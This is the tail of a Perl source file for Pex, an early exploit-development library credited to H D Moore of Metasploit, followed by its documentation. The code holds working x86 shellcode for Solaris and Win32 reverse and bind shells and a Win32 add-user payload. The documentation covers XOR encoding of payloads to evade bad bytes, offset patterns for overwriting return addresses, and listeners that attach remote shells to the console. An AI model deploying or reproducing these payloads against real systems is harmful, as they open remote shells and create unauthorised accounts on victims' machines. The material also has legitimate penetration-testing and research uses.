    return $shellcode;
}


##
# Solaris Payloads
##


sub sc_x86_solaris_reverse {
    my ($object, $args) = @_;
    my ($host, $port) = ($args->{"LHOST"}, $args->{"LPORT"});

    my $off_host = 32;
    my $off_port = 38;

    my $shellcode = # solaris reverse connect by bighawk
    "\xb8\xff\xf8\xff\x3c\xf7\xd0\x50\x31\xc0\xb0\x9a\x50\x89\xe5\x31".
    "\xc9\x51\x41\x41\x51\x51\xb0\xe6\xff\xd5\x31\xd2\x89\xc7\x68\x93".
    "\x93\x93\x93\x66\x68\x93\x93\x66\x51\x89\xe6\x6a\x10\x56\x57\xb0".
    "\xeb\xff\xd5\x31\xd2\xb2\x09\x51\x52\x57\xb0\x3e\xff\xd5\x49\x79".
    "\xf2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53".
    "\x89\xe2\x50\x52\x53\xb0\x3b\xff\xd5";

    my $host_bin = gethostbyname($host);
    my $port_bin = reverse(pack("S", $port));
    
    if (length($host_bin) != 4)
    {
        $object->Error("invalid host");
        return undef;
    }
    
    substr($shellcode, $off_host - 1, 4, $host_bin);
    substr($shellcode, $off_port - 1, 2, $port_bin);
    return $shellcode;
}

sub sc_x86_solaris_bind {
    my ($object, $args) = @_;
    my ($port) = ($args->{"LPORT"});
    
    if (! $port)
    {
        $object->Error("invalid port");
        return undef;
    }
    
    my $off_port = 33;
    my $port_bin = reverse(pack("S", $port));
    
    my $shellcode = # solaris bind by bighawk
    "\xb8\xff\xf8\xff\x3c\xf7\xd0\x50\x31\xc0\xb0\x9a\x50\x89\xe5\x31".
    "\xc9\x51\x41\x41\x51\x51\xb0\xe6\xff\xd5\x31\xd2\x89\xc7\x52\x66".
    "\x68\x27\x10\x66\x51\x89\xe6\x6a\x10\x56\x57\xb0\xe8\xff\xd5\xb0".
    "\xe9\xff\xd5\x50\x50\x57\xb0\xea\xff\xd5\x31\xd2\xb2\x09\x51\x52".
    "\x50\xb0\x3e\xff\xd5\x49\x79\xf2\x50\x68\x2f\x2f\x73\x68\x68\x2f".
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe2\x50\x52\x53\xb0\x3b\xff\xd5";

    substr($shellcode, $off_port, 2, $port_bin);
    return $shellcode;
}



##
# Win32 Payloads
##

sub sc_x86_win32_reverse
{
    my ($object, $args) = @_;

    my $port = $args->{"LPORT"};
    my $off_port = 161;
    my $port_bin = reverse(pack("S", $port));

    my $host = $args->{"LHOST"};
    my $off_host = 154;
    my $host_bin = gethostbyname($host);

    my $shellcode =  # win32 reverse by hdm[at]metasploit.com
    "\xe8\x30\x00\x00\x00\x43\x4d\x44\x00\xe7\x79\xc6\x79\xec\xf9\xaa".
    "\x60\xd9\x09\xf5\xad\xcb\xed\xfc\x3b\x8e\x4e\x0e\xec\x7e\xd8\xe2".
    "\x73\xad\xd9\x05\xce\x72\xfe\xb3\x16\x57\x53\x32\x5f\x33\x32\x2e".
    "\x44\x4c\x4c\x00\x01\x5b\x54\x89\xe5\x89\x5d\x00\x6a\x30\x59\x64".
    "\x8b\x01\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x58\x08\xeb\x0c\x8d\x57".
    "\x24\x51\x52\xff\xd0\x89\xc3\x59\xeb\x10\x6a\x08\x5e\x01\xee\x6a".
    "\x08\x59\x8b\x7d\x00\x80\xf9\x04\x74\xe4\x51\x53\xff\x34\x8f\xe8".
    "\x83\x00\x00\x00\x59\x89\x04\x8e\xe2\xeb\x31\xff\x66\x81\xec\x90".
    "\x01\x54\x68\x01\x01\x00\x00\xff\x55\x18\x57\x57\x57\x57\x47\x57".
    "\x47\x57\xff\x55\x14\x89\xc3\x31\xff\x68\xc0\xa8\x00\xf7\x68\x02".
    "\x00\x22\x11\x89\xe1\x6a\x10\x51\x53\xff\x55\x10\x85\xc0\x75\x44".
    "\x8d\x3c\x24\x31\xc0\x6a\x15\x59\xf3\xab\xc6\x44\x24\x10\x44\xfe".
    "\x44\x24\x3d\x89\x5c\x24\x48\x89\x5c\x24\x4c\x89\x5c\x24\x50\x8d".
    "\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49\x51\x51\xff\x75\x00".
    "\x51\xff\x55\x28\x89\xe1\x68\xff\xff\xff\xff\xff\x31\xff\x55\x24".
    "\x57\xff\x55\x0c\xff\x55\x20\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b".
    "\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb".
    "\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0".
    "\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b".
    "\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b".
    "\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d\x5b\xc2\x08\x00";

    substr($shellcode, $off_port, 2, $port_bin);
    substr($shellcode, $off_host, 4, $host_bin);
    return($shellcode);
}

sub sc_x86_win32_bind
{
    my ($object, $args) = @_;

    my $port = $args->{"LPORT"};
    my $off_port = 166;
    my $port_bin = reverse(pack("S", $port));

    my $shellcode = # win32 bind by hdm[at]metasploit.com
    "\xe8\x38\x00\x00\x00\x43\x4d\x44\x00\xe7\x79\xc6\x79\xe5\x49\x86".
    "\x49\xa4\xad\x2e\xe9\xa4\x1a\x70\xc7\xd9\x09\xf5\xad\xcb\xed\xfc".
    "\x3b\x8e\x4e\x0e\xec\x7e\xd8\xe2\x73\xad\xd9\x05\xce\x72\xfe\xb3".
    "\x16\x57\x53\x32\x5f\x33\x32\x2e\x44\x4c\x4c\x00\x01\x5b\x54\x89".
    "\xe5\x89\x5d\x00\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c".
    "\xad\x8b\x58\x08\xeb\x0c\x8d\x57\x2c\x51\x52\xff\xd0\x89\xc3\x59".
    "\xeb\x10\x6a\x08\x5e\x01\xee\x6a\x0a\x59\x8b\x7d\x00\x80\xf9\x06".
    "\x74\xe4\x51\x53\xff\x34\x8f\xe8\x90\x00\x00\x00\x59\x89\x04\x8e".
    "\xe2\xeb\x31\xff\x66\x81\xec\x90\x01\x54\x68\x01\x01\x00\x00\xff".
    "\x55\x20\x57\x57\x57\x57\x47\x57\x47\x57\xff\x55\x1c\x89\xc3\x31".
    "\xff\x57\x57\x68\x02\x00\x22\x11\x89\xe6\x6a\x10\x56\x53\xff\x55".
    "\x18\x57\x53\xff\x55\x14\x57\x56\x53\xff\x55\x10\x89\xc2\x66\x81".
    "\xec\x54\x00\x8d\x3c\x24\x31\xc0\x6a\x15\x59\xf3\xab\x89\xd7\xc6".
    "\x44\x24\x10\x44\xfe\x44\x24\x3d\x89\x7c\x24\x48\x89\x7c\x24\x4c".
    "\x89\x7c\x24\x50\x8d\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49".
    "\x51\x51\xff\x75\x00\x51\xff\x55\x30\x89\xe1\x68\xff\xff\xff\xff".
    "\xff\x31\xff\x55\x2c\x57\xff\x55\x0c\xff\x55\x28\x53\x55\x56\x57".
    "\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18".
    "\x8b\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc".
    "\x31\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c".
    "\x24\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c".
    "\x01\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d".
    "\x5b\xc2\x08\x00";

    substr($shellcode, $off_port, 2, $port_bin);
    return($shellcode);
}


sub sc_x86_win32_adduser
{
    my ($object, $args) = @_;

    my $shellcode =  # win32 adduser by hdm[at]metasploit.com
    "\x66\x81\xec\x80\x00\x89\xe6\xe8\xba\x00\x00\x00\x89\x06\xff\x36".
    "\x68\x8e\x4e\x0e\xec\xe8\xc1\x00\x00\x00\x89\x46\x08\x31\xc0\x50".
    "\x68\x70\x69\x33\x32\x68\x6e\x65\x74\x61\x54\xff\x56\x08\x89\x46".
    "\x04\xff\x36\x68\x7e\xd8\xe2\x73\xe8\x9e\x00\x00\x00\x89\x46\x0c".
    "\xff\x76\x04\x68\x5e\xdf\x7c\xcd\xe8\x8e\x00\x00\x00\x89\x46\x10".
    "\xff\x76\x04\x68\xd7\x3d\x0c\xc3\xe8\x7e\x00\x00\x00\x89\x46\x14".
    "\x31\xc0\x31\xdb\x43\x50\x68\x72\x00\x73\x00\x68\x74\x00\x6f\x00".
    "\x68\x72\x00\x61\x00\x68\x73\x00\x74\x00\x68\x6e\x00\x69\x00\x68".
    "\x6d\x00\x69\x00\x68\x41\x00\x64\x00\x89\x66\x1c\x50\x68\x58\x00".
    "\x00\x00\x89\xe1\x89\x4e\x18\x68\x00\x00\x5c\x00\x50\x53\x50\x50".
    "\x53\x50\x51\x51\x89\xe1\x50\x54\x51\x53\x50\xff\x56\x10\x8b\x4e".
    "\x18\x49\x49\x51\x89\xe1\x6a\x01\x51\x6a\x03\xff\x76\x1c\x6a\x00".
    "\xff\x56\x14\xff\x56\x0c\x56\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c".
    "\x8b\x70\x1c\xad\x8b\x40\x08\x5e\xc2\x04\x00\x53\x55\x56\x57\x8b".
    "\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b".
    "\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31".
    "\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24".
    "\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01".
    "\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d\x5b".
    "\xc2\x04\x00";

    return($shellcode);
}


1;


=head1 NAME

Pex - The Perl Exploit Library

=head1 SYNOPSIS
    
    use Pex;
    my $pex = Pex->new ( EnableShellLog => 1, EnableShellCache => 1);
    
    # list available payloads for x86 linux and windows
    my $x = $pex->Payloads();
    print "Linux Payloads: " . join(", ", keys(%{ $x->{"x86"}->{"linux"} })) . "\n";
    print "Win32 Payloads: " . join(", ", keys(%{ $x->{"x86"}->{"win32"} })) . "\n";
    
    # create linux shellcode that does a reverse connect to 192.168.0.1:9999
    my $sc = $pex->SC("x86", "linux", "reverse", {LHOST => '192.168.0.1', LPORT => '1999'});
    
    # dword xor this shellcode with 0xdeadbeef 
    my $sc_enc = $pex->LongXor(0xdeadbeef, $sc_enc);
    
    # create a dword xor decoder for this architecture, key, and shellcode
    my $sc_dec = $pex->LongXorDecoder("x86", 0xdeadbeef, length($sc_enc));
    
    # put them together to create the final payload
    my $sc_dun = $sc_dec . $sc_enc;
    
    # this does the same thing, but faster :)
    my $sc_ez = $pex->EasySC("\x00", 512, "x86", "linux", "reverse", {LHOST => '192.168.0.1', LPORT => '1999'});

    
              

=head1 DESCRIPTION

This is the Perl Exploit Library. This module provides an object-oriented interface 
to common exploit development routines.

=head1 CONSTRUCTOR

=over 3

=item new ( $options )

Creates a new Pex object instance. Options are specified by passing a hash reference
as the sole argument to the new function. The following options are supported:

=over 3

=item EnableShellLog

Specify a non-zero value for this option to enable complete session logging of exploit
command shells.

=item ShellLogDir

This is the directory where exploit session logs are stored, it defaults to $HOME/.Pex and
will be created if it does not exist.


=item EnableShellCache

Specify a non-zero value for this option to enable complete session logging of exploit
command shells.

=item ShellCacheDir

This is the directory where cached payloads are stored, it defaults to $HOME/.Pex and
will be created if it does not exist.
 
=back
=back


=head1 METHODS

=over 3

=item Error ($message)

The Error method is used to track the last error generated by the Pex library.
Calling it with no arguments will return the last error reported.

=item DebugLevel ($level)

This method sets the debug level for the entire Pex library. The lower the debug
level, the more debugging output will be displayed.

=item DebugPrint ($message, $level)

This routine is used to display errors and debugging information produced by the
Pex library. The level must be less than the current DebugLevel for it to be displayed.

=item ShellCache ($enable, $directory)

Enable the shellcode caching feature and define the directory where the cached data
will be stored. The cache directory defaults to ~/.Pex and will be created if it does
not already exist.

=item ShellLog ($enable, $directory)

Enable the command shell session logging feature and define the directory where the 
logs are stored. The log directory defaults to ~/.Pex and will be created if it does
not already exist.

=item GetHead ($host, $port)

Performs a HTTP HEAD request on the host and port specified and returns the string
returned after the Server: header in the response.

=item ShellListen ({LPORT => $port})

Forks the parent process and caused the child to return with the pid of the parent.
The parent process will listen on the port specified until a connection is recieved. 
When a connection is made to the parent process, the child is killed and an interactive
shell is started between the console and the connected socket. When the socket is
closed or the parent receives a SIGINT, the child process is killed and the
parent process returns to the calling function with a zero value. If an error occurs,
this function will immediately return with an undefined value.

=item ShellConnect ({LHOST=> $host, LPORT => $port})

Forks the parent process and caused the child to return with the pid of the parent.
The parent process will try to connect the remote host and port specified every second until
successful. When a connection is made to the parent process, the child is killed and an interactive
shell is started between the console and the connected socket. When the socket is
closed or the parent receives a SIGINT, the child process is killed and the
parent process returns to the calling function with a zero value. If an error occurs,
this function will immediately return with an undefined value.

=item StartShell ($socket)

Connects the given socket to the console and pipes data between them. This method is used by the
ShellListen() and ShellConnect() functions to connect the remote command shell to the
local console. On Windows platforms, a child process is spawned to poll the console for
input.

=item UnblockHandle ($handle)

Sets the blocking method to zero and the autoflush method to one. If the host supports
the Fcntl routine, the O_NONBLOCK flag is enabled.

=item ShellCacheHasher ($value, $seed)

Used to generate a unique hash value based on the $value parameter. The $seed value
is added to the final hash before it is returned. The return value is a two element
array containing the hash value and the updated seed.

=item ShellCacheKey ($shellcode, $badbytes)

Return a unique hash value based on the shellcode size, content, and allowed bytes. This
routine is used by the EasySC() method to cache the results of the encoding operations.

=item ShellCacheGet ($cache_key)

Look for a cached payload result based on the key. Any key that matches the shellcode hash
and all allowed bytes will be returned if available.

=item ShellCacheStore ($cache_key, $cache_data)

Write the payload into the cache directory into a file based on the $cache_key.

=item Xor ($xor_value, $buffer)

Performs a byte XOR against all characters in $buffer based on the numerical value in $xor_value.

=item LongXor ($xor_value, $buffer)

Performs a four byte XOR against all characters in $buffer based on the numerical value in $xor_value.

=item ShortXor ($xor_value, $buffer)

Performs a two byte XOR against all characters in $buffer based on the numerical value in $xor_value.

=item HasBadChars ($bad_chars, $buffer)

Returns true if any of the characters in the string $bad_chars are found in $buffer and false otherwise.

=item CreatePerlBuffer ($buffer)

Takes a binary value and returns a formatted string ready to paste into a Perl script.

=item PatternCreate ($length)

Generates a string of repeating characters up to the length specified in $length. This buffer can be 
used with the PatternOffset() method to determine the exact index into the return buffer that overwrote
a return address.

=item PatternOffset ($pattern, $address)

Looks for an occurance of the binary version of the long integer $address in the specified $pattern.
This method returns an array containing the indexes of all the matches.

=item SC ($arch, $os, $name, $args)

Returns a shellcode payload based on the architecture, operating system, payload name, and
specific arguments given. An undefined value is returned if no payload by that name exists.

=item EasySC ($bad_bytes, $length, $arch, $os, $name, $args)

Returns a XOR encoded shellcode buffer padded with nops to equal the exact length specified by the $length
parameter. This method will use the four byte XOR encoder to find a sequence that results in none
of the characters in the $bad_bytes string being part of the result. If any of the bad characters exist
in the actual four byte XOR decoder (LongXorDecoder()), this method will never return.

=back

=head1 AUTHOR

H D Moore <hdm[at]metasploit.com>

=head1 COPYRIGHT

Copyright (c) 2003 METASPLOIT.COM

=cut
